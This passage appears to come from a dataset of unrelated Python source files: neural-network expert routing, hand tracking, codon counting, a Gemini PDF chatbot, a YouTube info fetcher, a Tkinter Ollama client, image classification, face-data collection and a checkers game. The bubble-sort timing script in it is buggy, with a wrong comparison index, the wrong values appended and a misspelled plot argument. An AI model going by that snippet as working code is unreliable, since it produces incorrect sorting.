)\n\n        # One hot encode the selected experts to create an expert mask\n        # this will be used to easily index which expert is going to be sollicitated\n        # [8,2,20]\n        expert_mask = torch.nn.functional.one_hot(selected_experts, num_classes=self.num_experts).permute(2, 1, 0)\n\n        # Loop over all available experts in the model and perform the computation on each expert\n        for expert_idx in range(self.num_experts):\n            expert_layer = self.experts[expert_idx]\n            # idx\u662f\u4e24\u884c\u4e2d\u7684\u54ea\u4e00\u884c top_x\u662f\u6bcf\u5217\u7684\u54ea\u4e00\u5217 \u53c2\u8003test.ipynb\u6587\u4ef6\u8bf4\u660e\n            idx, top_x = torch.where(expert_mask[expert_idx])\n\n            # \n  ",
    "import mediapipe as mp\r\nimport cv2\r\n\r\nhands = mp.solutions.hands\r\ndraw = mp.solutions.drawing_utils\r\nstyleDot = draw.DrawingSpec(color=(252, 191, 0), thickness=3)\r\nstyleLine = draw.DrawingSpec(color=(255, 255, 255), thickness=2)\r\n# \u8bbe\u7f6ehand\u53c2\u6570\r\nmp_hand = hands.Hands(min_tracking_confidence=0.5, min_detection_confidence=0.7, max_num_hands=2)\r\nwidth = 1280\r\nheight = 720\r\ncap = cv2.VideoCapture(4)#\u6211\u7684\u6444\u50cf\u5934\u662f\u7b2c5\u4e2a\r\ncap.set(cv2.CAP_PROP_FRAME_WIDTH, width)\r\ncap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)\r\nis_status = 0\r\nthread_num = 0\r\nwhile cap.isOpened():\r\n    ret, img = cap.read()\r\n    if not ret:\r\n        continue\r\n    img.flags.writeable = False\r\n    imgRGB = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\r\n    result = mp_hand.process(imgRGB)\r\n    if result.multi_hand_landmarks:\r\n        is_status = 1\r\n        for hs in result.multi_hand_landmarks:\r\n            draw.draw_landmarks(img, hs, hands.HAND_CONNECTIONS, styleDot, styleLine)\r\n            y7 = int(hs.landmark[7].y * height)\r\n            y12 = int(hs.landmark[12].y * height)\r\n            y16 = int(hs.landmark[16].y * height)\r\n            if int(hs.landmark[17].x * width) > int(hs.landmark[5].x * width):\r\n                x4 = int(hs.landmark[4].x * width)\r\n                x2 = int(hs.landmark[2].x * width)\r\n                if x2 - x4 > 50:\r\n                    is_status = 0\r\n                    thread_num = 0\r\n                elif y7 < y12 and y7 < y16 and is_status == 1:\r\n                    y8 = int(hs.landmark[8].y * height)\r\n                    x8 = int(hs.landmark[8].x * width)\r\n    else:\r\n        is_status = 0\r\n        thread_num = 0\r\n    cv2.imshow('img', img)\r\n    if cv2.waitKey(1) == ord('q'):\r\n        break\r\nmp_hand.close()\r\ncap.release()\r\ncv2.destroyAllWindows()\r\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Wed Feb  8 15:01:23 2023\r\n\r\n@author: Tommy\r\n\"\"\"\r\nimport gzip\r\nfrom glob import glob\r\nimport matplotlib.pyplot as plt\r\nimport os\r\n\r\ndef openfile(filePath):  # openening and reading the fastafile and gfffile\r\n    if filePath.endswith(\".gz\"):\r\n        with gzip.open(filePath, 'rt') as f:\r\n            return [l.strip() for l in f.readlines()]\r\n    else:\r\n        with open(filePath, 'r') as f:\r\n            return [l.strip() for l in f.readlines()]\r\n\r\ndef GcContent(seq):  # calculating the gc content percentage\r\n    return round((seq.count('C') + seq.count('G')) / len(seq) * 100, 6)\r\n\r\ndef parse_fasta(filename):\r\n    FastaFile = openfile(filename)\r\n    FDict = {}\r\n    chromosomeID = \"\"\r\n    nucleotide_sequence = \"\"\r\n    for line in FastaFile:\r\n        line = line.strip()\r\n        if line.startswith(\">\"):\r\n            if chromosomeID != \"\":\r\n                FDict[chromosomeID] = nucleotide_sequence\r\n                nucleotide_sequence = \"\"\r\n            chromosomeID = line.strip().split(' ')[2].split(':')[2]\r\n        else:\r\n            nucleotide_sequence += line\r\n    # adds the last sequence to the dictionary because there isn't a > after the last line\r\n    FDict[chromosomeID] = nucleotide_sequence\r\n    return FDict\r\n\r\ndef parse_gff(gff_file):\r\n    gff_dict = {}\r\n    f = openfile(gff_file)\r\n    for line in f:\r\n        if line.startswith('#'):\r\n            continue\r\n        fields = line.strip().split('\\t')\r\n        if fields[2] == 'gene':\r\n            gene_id = fields[8].split(';')[0]\r\n            start = int(fields[3])\r\n            stop = int(fields[4])\r\n            chromosome = fields[0]\r\n            gff_dict[gene_id] = (start, stop, chromosome) # creates gff dict\r\n    return gff_dict  # Press Ctrl+F8 to toggle the breakpoint.\r\n\r\ndef get_End_Seq(gff_dict, FDict, gene):\r\n    stopRegion = gff_dict[gene][1]          #stop coordinates of gene\r\n    chromosome = gff_dict[gene][2]\r\n    endSeq = (FDict[chromosome][stopRegion + 2:stopRegion + 14])\r\n    return endSeq\r\n\r\ndef get_Initial_StopCodon(gff_dict, FDict, gene):\r\n    stopRegion = gff_dict[gene][1]\r\n    chromosome = gff_dict[gene][2]\r\n    initialStopCodon = (FDict[chromosome][stopRegion - 1:stopRegion+2])# stop codons ????\r\n    return initialStopCodon\r\n\r\ndef get_start_Seq(gff_dict, FDict, gene):\r\n    startRegion = gff_dict[gene][0]\r\n    chromosome = gff_dict[gene][2]\r\n    startSeq = (FDict[chromosome][startRegion - 13:startRegion - 1]) # front end\r\n    return startSeq\r\n\r\ndef get_Initial_StartCodon(gff_dict, FDict, gene):\r\n    startRegion = gff_dict[gene][0]\r\n    chromosome = gff_dict[gene][2]\r\n    initialStartCodon = (FDict[chromosome][startRegion - 1:startRegion + 2]) # start codons ???\r\n    return initialStartCodon\r\n\r\ndef tandemStopCount(endSeq, initialStopCodon, total_stop_codons, total_stop_codons_dict):\r\n    stop_codons = [\"TAA\", \"TAG\", \"TGA\"] # list of possible stop codons\r\n    initialStopCodon_count = 0\r\n    tan_TAA_count = 0\r\n    tan_TAG_count = 0\r\n    tan_TGA_count = 0\r\n    freq = {codon: 0 for codon in stop_codons}\r\n    indexes = {codon: [] for codon in stop_codons}\r\n    for i in range(0, len(endSeq) - 2, 3):  # loops over all stop codons in the endseq\r\n        if len(endSeq) - i >= 3:  # Check if there are at least 3 characters left to form a codon\r\n            codon = endSeq[i:i + 3]\r\n            if codon in stop_codons:\r\n                if (i + 3) % 3 == 0:\r\n                    freq[codon] += 1\r\n                    indexes[codon].append(i)\r\n                    if codon == 'TAA':\r\n                        tan_TAA_count += 1 # iterates to count the condon usage\r\n                    if codon == 'TAG':\r\n                        tan_TAG_count += 1\r\n                    if codon == 'TGA':\r\n                        tan_TGA_count += 1\r\n                total_stop_codons += 1\r\n    if initialStopCodon in stop_codons:\r\n        initialStopCodon_count += 1\r\n        total_stop_codons_dict[initialStopCodon] = (\r\n            total_stop_codons_dict[initialStopCodon][0] + initialStopCodon_count, # returns count to the dict to count frequecy on multiple genes\r\n            total_stop_codons_dict[initialStopCodon][1] + tan_TAA_count,\r\n            total_stop_codons_dict[initialStopCodon][2] + tan_TAG_count,\r\n            total_stop_codons_dict[initialStopCodon][3] + tan_TGA_count\r\n        )\r\n    tandemStopCountData = [freq, indexes, total_stop_codons, total_stop_codons_dict]\r\n    return tandemStopCountData\r\n\r\ndef tandemStartCount(startSeq, initialStartCodon, total_start_codons, total_start_codons_dict):\r\n    start_codons = [\"ATG\", \"GTG\", \"TTG\"] # list of possible start codons\r\n    initialStartCodon_count = 0\r\n    tan_ATG_count = 0\r\n    tan_GTG_count = 0\r\n    tan_TTG_count = 0\r\n    freq = {codon: 0 for codon in start_codons}\r\n    indexes = {codon: [] for codon in start_codons}\r\n    for i in range(0, len(startSeq) - 2, 3):  # loops over all stop codons in the startseq\r\n        codon = startSeq[i:i + 3]\r\n        if codon in start_codons:\r\n    ",
    "import streamlit as st\r\nfrom PyPDF2 import PdfReader\r\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\r\nfrom langchain_google_genai import GoogleGenerativeAIEmbeddings\r\nimport google.generativeai as genai\r\nfrom langchain.vectorstores import FAISS\r\nfrom langchain_community.vectorstores import FAISS\r\nfrom langchain_google_genai import ChatGoogleGenerativeAI\r\nfrom langchain.chains.question_answering import load_qa_chain\r\nfrom langchain.prompts import PromptTemplate\r\nimport os\r\n\r\nst.set_page_config(page_title=\"SuperAI Document\", layout=\"wide\")\r\n\r\nst.markdown(\"\"\"\r\n## SuperAI Document: Get instant insights from your Documents\r\n\r\nThis chatbot is built using the Retrieval-Augmented Generation (RAG) framework, leveraging Google's Generative AI model Gemini-PRO. It processes uploaded PDF documents by breaking them down into manageable chunks, creates a searchable vector store, and generates accurate answers to user queries. This advanced approach ensures high-quality, contextually relevant responses for an efficient and effective user experience.\r\n\r\n### How It Works\r\n\r\nFollow these simple steps to interact with the chatbot:\r\n\r\n1. **Enter Your API Key**: You'll need a Google API key for the chatbot to access Google's Generative AI models. Obtain your API key https://makersuite.google.com/app/apikey.\r\n\r\n2. **Upload Your Documents**: The system accepts multiple PDF files at once, analyzing the content to provide comprehensive insights.\r\n\r\n3. **Ask a Question**: After processing the documents, ask any question related to the content of your uploaded documents for a precise answer.\r\n\"\"\")\r\n\r\n\r\n\r\n# This is the first API key input; no need to repeat it in the main function.\r\napi_key = st.text_input(\"Enter your Google API Key:\", type=\"password\", key=\"api_key_input\")\r\n\r\ndef get_pdf_text(pdf_docs):\r\n    text = \"\"\r\n    for pdf in pdf_docs:\r\n        pdf_reader = PdfReader(pdf)\r\n        for page in pdf_reader.pages:\r\n            text += page.extract_text()\r\n    return text\r\n\r\ndef get_text_chunks(text):\r\n    text_splitter = RecursiveCharacterTextSplitter(chunk_size=10000, chunk_overlap=1000)\r\n    chunks = text_splitter.split_text(text)\r\n    return chunks\r\n\r\ndef get_vector_store(text_chunks, api_key):\r\n    embeddings = GoogleGenerativeAIEmbeddings(model=\"models/embedding-001\", google_api_key=api_key)\r\n    vector_store = FAISS.from_texts(text_chunks, embedding=embeddings)\r\n    vector_store.save_local(\"faiss_index\")\r\n\r\ndef get_conversational_chain():\r\n    prompt_template = \"\"\"\r\n    Answer the question as detailed as possible from the provided context, make sure to provide all the details, if the answer is not in\r\n    provided context just say, \"answer is not available in the context\", don't provide the wrong answer\\n\\n\r\n    Context:\\n {context}?\\n\r\n    Question: \\n{question}\\n\r\n\r\n    Answer:\r\n    \"\"\"\r\n    model = ChatGoogleGenerativeAI(model=\"gemini-pro\", temperature=0.3, google_api_key=api_key)\r\n    prompt = PromptTemplate(template=prompt_template, input_variables=[\"context\", \"question\"])\r\n    chain = load_qa_chain(model, chain_type=\"stuff\", prompt=prompt)\r\n    return chain\r\n\r\ndef user_input(user_question, api_key):\r\n    embeddings = GoogleGenerativeAIEmbeddings(model=\"models/embedding-001\", google_api_key=api_key)\r\n    new_db = FAISS.load_local(\"faiss_index\", embeddings,allow_dangerous_deserialization=True)\r\n    docs = new_db.similarity_search(user_question)\r\n    chain = get_conversational_chain()\r\n    response = chain({\"input_documents\": docs, \"question\": user_question}, return_only_outputs=True)\r\n    st.write(\"Reply: \", response[\"output_text\"])\r\n\r\ndef main():\r\n    st.header(\"AI clone chatbot\ud83d\udc81\")\r\n\r\n    user_question = st.text_input(\"Ask a Question from the PDF Files\", key=\"user_question\")\r\n\r\n    if user_question and api_key:  # Ensure API key and user question are provided\r\n        user_input(user_question, api_key)\r\n\r\n    with st.sidebar:\r\n        st.title(\"Menu:\")\r\n        pdf_docs = st.file_uploader(\"Upload your PDF Files and Click on the Submit & Process Button\", accept_multiple_files=True, key=\"pdf_uploader\")\r\n        if st.button(\"Submit & Process\", key=\"process_button\") and api_key:  # Check if API key is provided before processing\r\n            with st.spinner(\"Processing...\"):\r\n                raw_text = get_pdf_text(pdf_docs)\r\n                text_chunks = get_text_chunks(raw_text)\r\n                get_vector_store(text_chunks, api_key)\r\n                st.success(\"Done\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "import requests\n\ndef get_video_info(video_url):\n    api_url = f\"https://youtubedownloader-api.onrender.com/youtube-video/?url={video_url}\"\n    response = requests.get(api_url)\n    \n    if response.status_code == 200:\n        data = response.json()\n        video_info = data['response']\n        return video_info\n    else:\n        return None\n\ndef main():\n    video_url = input(\"\u6700\u521d\u306b\u52d5\u753b\u306eURL\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044: \")\n    video_info = get_video_info(video_url)\n    \n    if video_info:\n        print(\"\u52d5\u753b\u60c5\u5831:\")\n        print(f\"\u30bf\u30a4\u30c8\u30eb: {video_info['title']}\")\n        print(f\"\u8aac\u660e: {video_info['description']}\")\n        print(f\"\u8996\u8074\u56de\u6570: {video_info['viewCount']}\")\n        print(f\"\u30ab\u30c6\u30b4\u30ea: {video_info['category']}\")\n        print(f\"\u516c\u958b\u65e5: {video_info['publishDate']}\")\n        print(f\"\u30c1\u30e3\u30f3\u30cd\u30eb\u540d: {video_info['channelName']}\")\n        print(f\"\u30c1\u30e3\u30f3\u30cd\u30eb\u767b\u9332\u8005\u6570: {video_info['subscriberCount']}\")\n        print(\"\u52d5\u753bURL:\")\n        for video in video_info['videos']:\n            if video['hasAudio']:\n                print(video['url'])\n    else:\n        print(\"\u52d5\u753b\u60c5\u5831\u3092\u53d6\u5f97\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import time\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\ndef bubblersort (arr):\r\n    for i in range (len(arr)):\r\n        for j in range (0,len(arr)-i-1):\r\n            if arr[i]>arr[j+1]:\r\n                temp=arr[j]\r\n                arr[j]=arr[j+1]\r\n                arr[j+1]=temp\r\ntimes=list()\r\narr=list()\r\nnumtimes=list()\r\nfor i in range(1,8):\r\n    start=time.time()\r\n    n=int(input(\"Enter the no of element\"))\r\n    numtimes.append (n)\r\n    for x in range(n):\r\n        number=np.random.randint(10,99)\r\n        arr.append(n)\r\n    print(\"List before sorting\",x+1,\"Element\")\r\n    print(arr)\r\n    bubblersort(arr)\r\n    end=time.time()\r\n    times.append(end-start)\r\n    print(\"list after bubblesort of\",x+1,\"element\")\r\n    print(arr)\r\n    bubblersort(arr)\r\n    print(\"time taken for bubblr sort for\",n,\"element is\",end-start)\r\n    print(numtimes)\r\n    print(times)\r\n    plt.xlabel('list length')\r\n    plt.ylabel('time complexity')\r\n    plt.plot(numtimes,times,leble=\"bubblesort\")\r\n    plt.grid()\r\n    plt.legend()\r\n    plt.show()",
    "from tkinter import *\nfrom PIL import ImageTk, Image\nfrom tkinter import scrolledtext, messagebox\nimport ollama\nfrom datetime import datetime\n\n\n\n##########################################################\n# Reading the configuration\n##########################################################e\nwith open('config.txt', 'r') as file:\n    lines = file.readlines()\n\nconfig = {}\n\nfor line in lines:\n\n    key, value = line.strip().split('=')\n    \n\n    key = key.strip()\n    value = value.strip()\n    \n    config[key] = value\n\nif config['debug'] == 'true':\n    print(config)\n\n##########################################################\n# Defining All the functions\n##########################################################\ndef save_conversation():\n    conversation = chat_display.get(\"1.0\", END)\n    with open(f\"conversations/conversation{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt\", \"w\") as file:\n        file.write(conversation)\n    messagebox.showinfo(\"Save Conversation\", \"Conversation saved successfully.\")\n\n\ndef clear_conversation():\n    chat_display.configure(state='normal')\n    chat_display.delete('1.0', END)\n    chat_display.configure(state='disabled')\n\n\n\ndef send_message(event=None):\n    message = entry.get()\n    if message:\n        entry.delete(0, END)\n        \n        response = get_response(message)        \n        chat_display.configure(state='normal')  \n        chat_display.insert(END, \"You: \" + message + \"\\n\")\n        chat_display.insert(END, f\"{config['name']}: \" + response + \"\\n\")\n        chat_display.configure(state='disabled')  \n\ndef get_response(message):\n    try:\n        response = ollama.chat(model=config['model'], messages=[{'role': 'user', 'content': message}])\n        return response['message']['content']\n    except Exception as e:\n        print(\"Error:\", e)\n        return \"Error: Failed to get response from model\"\n\n##########################################################\n# Everything that has to do with the GUI\n##########################################################\nroot = Tk()\nroot.title(config['title'])\n\n\n# Menu Bar\nmenubar = Menu(root)\nroot.config(menu=menubar)\n\nfile_menu = Menu(menubar, tearoff=False)\n\nfile_menu.add_command(\n    label='Save Conversation',\n    command=save_conversation\n)\n\nfile_menu.add_command(\n    label='Clear Conversation',\n    command=clear_conversation\n)\n\nfile_menu.add_command(\n    label='Exit',\n    command=root.destroy\n)\n\n\nmenubar.add_cascade(\n    label=\"File\",\n    menu=file_menu\n)\n\n# loading the image\nif config['image'] == 'true':\n    img = ImageTk.PhotoImage(Image.open(f\"images/{config['imagePath']}.png\"))\n    panel = Label(root, image=img)\n    panel.pack(side=\"left\", fill=\"both\", expand=\"no\")\n\n# Inital Message\ninitial_message = f\"\\n---------- DEBUG ----------\\nConnected To Ollama Server.\\nRunning Version {config['version']}. Model: {config['model']}\"\nchat_display = scrolledtext.ScrolledText(root, wrap=WORD, width=40, height=15, state='normal')\nif config['debug']:\n    chat_display.insert(END, \"Programm: \" + initial_message + \"\\n\")\nchat_display.configure(state='disabled')  \nchat_display.pack(padx=10, pady=10)\n\n# user input\nentry = Entry(root, width=40)\nentry.pack(pady=5)\n\n\n# send button\nsend_button = Button(root, text=\"Send\", command=send_message)\nsend_button.pack(pady=5)\n\n\n# Bind the Enter key to the send_message function\nentry.bind(\"<Return>\", send_message)\n\n# Run the Tkinter event loop\nroot.mainloop()\n",
    "import random\nimport string\nimport nltk\nfrom collections import Counter\n\n# give truth to each three letter combination of letters\ntruth_table = {}\n\nlowercase_letters = string.ascii_lowercase\n\nword_dict = nltk.corpus.words.words()\n\n# all words should be lowercase\nword_dict = [word.lower() for word in word_dict]\n# remove symbols\nword_dict = [word for word in word_dict if word.isalpha()]\n\n# build a table that maps X to the most common characters next to XXX\nnext_to_x = {}\n\nfor i in lowercase_letters:\n    for j in lowercase_letters:\n        for k in lowercase_letters:\n            for l in lowercase_letters:\n                next_to_x[i + j + k + l] = Counter()\n\nfor word in word_dict:\n    for i in range(len(word) - 4):\n        next_to_x[word[i:i+4]][word[i+4]] += 1\n\n# trigger .most_common for each\nfor key in next_to_x:\n    next_to_x[key] = next_to_x[key].most_common()\n\n# print(next_to_x)\n\n# trith table should be every combination of 3 lowercase letters\nfor i in lowercase_letters:\n    for j in lowercase_letters:\n        for k in lowercase_letters:\n            for l in lowercase_letters:\n                # use the most common letter that comes after i, j, k\n                if len(next_to_x[i + j + k + l]) > 0:\n                    truth_table[i + j + k + l] = next_to_x[i + j + k + l][0][0]\n                else:\n                    truth_table[i + j + k + l] = random.choice(lowercase_letters)\n\nK = 5\n\nword_count_for_each_state = {w: 0 for w in truth_table.values()}\n\n# nodes = [random.choice(lowercase_letters) for _ in range(K)]\nnodes = list(\"baaab\")\n\nconnections = {\n    k: [random.randint(0, K - 1) for k in range(4)] for k in range(K)\n}\n# coffee = 291\n# aaaaa = 1111\n# zzzzz = 908\n# 10m iters w/ aaaaa as seeed = 3458\n\nfound_words = set(nltk.corpus.words.words())\n\nunique_words = {}\nstate_counts = {}\n\n# count # of words of length K\ntotal_words_to_find = 0\n\nfor word in found_words:\n    if len(word) == K:\n        total_words_to_find += 1\n\niters = 0\n\nwith open(\"output.txt\", \"w\") as f:\n    while iters < 10000: # 10_000_000:\n        new_nodes = nodes.copy()\n\n        for i in range(K):\n            inputs = \"\".join([str(nodes[k]) for k in connections[i]])\n            new_nodes[i] = truth_table[inputs]\n\n        nodes = new_nodes\n\n        iters += 1\n        state = \"\".join(nodes)\n        if state not in state_counts:\n            state_counts[state] = 0\n\n        state_counts[state] += 1\n        # flip a random bit if state count > 10\n        if state_counts[state] > 3: # or state in found_words:\n            print(\"Flipping a random bit for state\", state)\n            idx = random.randint(0, K - 1)\n            # get 2nd most common letter if available\n            if next_to_x.get(state[idx-2:idx+1]) and len(next_to_x[state[idx-2:idx+1]]) > 1:\n                print(\"Getting nth most common letter\")\n                word_count_for_each_state[state[idx]] += 1\n                nth_common = word_count_for_each_state[state[idx]]\n                # if nth common exceeds the number of common letters, reset to 0\n                if nth_common >= len(next_to_x[state[idx-2:idx+1]]):\n                    nth_common = 0\n                    word_count_for_each_state[state[idx]] = 0\n                new_nodes[idx] = next_to_x[state[idx-2:idx+1]][nth_common][0]\n            # else:\n            #     new_nodes[idx] = random.choice(lowercase_letters)\n            state_counts[state] = 0\n        \n        #add to unique words\n        if state in found_words:\n            unique_words[state] = iters\n\n        print(len(unique_words),  total_words_to_find)\n\n    for word, iteration in unique_words.items():\n        f.write(f\"{word}, {iteration}\\n\")",
    "from transformers import ViTImageProcessor, ViTForImageClassification\nimport streamlit as st\nfrom PIL import Image\nimport requests\n\n\n@st.cache\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043c\u043e\u0434\u0435\u043b\u0438 \u0434\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439\ndef load_model():\n    return ViTForImageClassification.from_pretrained('google/vit-base-patch16-224')\n\n\n@st.cache\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440\u0430 \u0434\u043b\u044f \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439 \u0432 \u0442\u0440\u0435\u0431\u0443\u0435\u043c\u043e\u043c \u0444\u043e\u0440\u043c\u0430\u0442\u0435\ndef load_processor():\n    return ViTImageProcessor.from_pretrained('google/vit-base-patch16-224')\n\n\n# \u041e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044f \u0434\u043b\u044f \u0432\u0432\u043e\u0434\u0430 \u0441\u0441\u044b\u043b\u043a\u0438 \u043d\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\ndef get_image_link():\n    return st.text_input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u043d\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0440\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0438\u044f\")\n\n\n# \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438 \u0432\u044b\u0432\u043e\u0434 \u0435\u0433\u043e \u043d\u0430 \u044d\u043a\u0440\u0430\u043d \ndef load_image(url):\n    img = Image.open(requests.get(url, stream=True).raw)\n    st.image(img)\n    return img\n\n\n# \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0438 \u0440\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0438\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\ndef image_classification(picture):\n    inputs = processor(images=picture, return_tensors=\"pt\")\n    outputs = model(**inputs)\n    logits = outputs.logits\n    predicted_class_idx = logits.argmax(-1).item()\n    return model.config.id2label[predicted_class_idx]\n\n\n# \u0412\u044b\u0432\u043e\u0434 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432 \u043d\u0430 \u044d\u043a\u0440\u0430\u043d\ndef show_results(results):\n    st.write(results)\n\n\nprocessor = load_processor()\nmodel = load_model()\n\nst.title('\u041c\u043e\u0434\u0435\u043b\u044c \u0434\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439 vit-base-patch16-224')\n\nlink = get_image_link()\n\nresult = st.button('\u0420\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0442\u044c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435')\n\nif result:\n    try:\n        loaded_image = load_image(link)\n        with st.spinner('\u0418\u0434\u0435\u0442 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430... \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435...'):\n            result = image_classification(loaded_image)\n        st.markdown(f'\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b \u0440\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0438\u044f: :rainbow[{result}]')\n        st.snow()\n    # \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043f\u0440\u0438\u0432\u0435\u0434\u0443\u0442 \u043a \u043e\u0448\u0438\u0431\u043a\u0435 \u0432 \u0441\u043b\u0443\u0447\u0430\u0435 \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0441\u0441\u044b\u043b\u043a\u0438\n    # \u0438\u043b\u0438 \u0443\u043a\u0430\u0437\u0430\u043d\u0438\u044f \u0441\u0441\u044b\u043b\u043a\u0438 \u043d\u0430 \u043e\u0431\u044a\u0435\u043a\u0442, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\u043c\n    except IOError:\n        st.error(' \u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043d\u0430\u0439\u0442\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u043f\u043e \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0439 \u0441\u0441\u044b\u043b\u043a\u0435. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430!', icon=\"\ud83d\ude1e\")\n",
    "\"\"\" \u6a21\u578b\u6570\u636e\u7684\u6536\u96c6\u53ca\u8bad\u7ec3 \"\"\"\n\nimport os\nimport time\nfrom tkinter import Label, ttk\n\nimport cv2\nimport numpy as np\nfrom PIL import Image\n\nfrom constants import CASCADE, PATH\n\n\ndef collect(name: str, maxm: int, bar: ttk.Progressbar, info: Label, bt: ttk.Button, t_add) -> None:\n    \"\"\" \u6570\u636e\u6536\u96c6 \"\"\"\n    info.configure(text='\u6b63\u5728\u6536\u96c6\u6570\u636e\u2026')\n    cap = cv2.VideoCapture(0)\n    face_detector = cv2.CascadeClassifier(CASCADE)\n    count = 0\n\n    while True:\n        success, img = cap.read()\n        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n        # \u5176\u4e2dgray\u4e3a\u8981\u68c0\u6d4b\u7684\u7070\u5ea6\u56fe\u50cf\uff0c1.3\u4e3a\u6bcf\u6b21\u56fe\u50cf\u5c3a\u5bf8\u51cf\u5c0f\u7684\u6bd4\u4f8b\uff0c5\u4e3aminNeighbors\n        faces = face_detector.detectMultiScale(gray, 1.3, 5)\n\n        for x, y, w, h in faces:\n            count += 1\n            bar.configure(value=count/maxm)\n            cv2.imwrite(\"data/%d.jpg\" % count, gray[y:y+h, x:x+w])\n\n        if cv2.waitKey(1) == '27' or count >= maxm:\n            break\n\n    cap.release()\n    cv2.destroyAllWindows()\n    info.configure(text='\u6b63\u5728\u8bad\u7ec3\u6a21\u578b\u2026')\n    t_add(train(name, maxm, bar))\n    bt.configure(state='normal')\n    bar.configure(value=0.)\n    info.configure(text='\u70b9\u51fb\u201c\u5f55\u5165\u201d\u4ee5\u8bad\u7ec3\u6570\u636e')\n\n\ndef train(name: str, maxm: int, bar: ttk.Progressbar) -> str:\n    \"\"\" \u8bad\u7ec3 \"\"\"\n    now = time.strftime(\"%Y-%m-%d %H'%M'%S\", time.localtime())\n    face_samples, ids = [], []\n    recog = cv2.face.LBPHFaceRecognizer_create()\n    detector = cv2.CascadeClassifier(CASCADE)\n    count = 0\n\n    for path in os.listdir(PATH+'/data'):\n        path = PATH+'/data/'+path\n        img_np = np.array(Image.open(path).convert('L'), 'uint8')\n        id = int(path.split('.')[0].split('/')[-1])\n        os.remove(path)\n\n        for x, y, w, h in detector.detectMultiScale(img_np):\n            face_samples.append(img_np[y:y+h, x:x+w])\n            ids.append(id)\n            count += 1\n            bar.configure(value=count/maxm)\n\n    recog.train(face_samples, np.array(ids))\n    name = '%d_%s_%s.yml' % (maxm, name, now)\n    recog.save('trainner/'+name)\n    return name[:-4]\n",
    "import pygame\n\nclass Agent:\n    def __init__(self, color):\n        self.color = color\n\n    def move(self, board):\n        if self.color == \"red\":\n            print(\"Red player's turn\")\n        else:\n            print(\"Black player's turn\")\n\n        selected_piece = None\n        valid_moves = []\n\n        while True:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    pygame.quit()\n                    return\n\n                if event.type == pygame.MOUSEBUTTONDOWN:\n                    mouse_pos = pygame.mouse.get_pos()\n                    row, col = mouse_pos[1] // 100, mouse_pos[0] // 100\n                    piece = board.get_piece(row, col)\n\n                    if piece and piece.color == self.color:\n                        if selected_piece == piece:\n                            board.select_piece(row, col)\n                            board.unhighlight_squares()\n                            selected_piece = None\n                            valid_moves = []\n                        else:\n                            board.unhighlight_squares()\n                            selected_piece = piece\n                            valid_moves = board.get_valid_moves(piece)\n                            board.highlight_valid_moves(valid_moves)\n                    else:\n                        if selected_piece:\n                            if (row, col) in 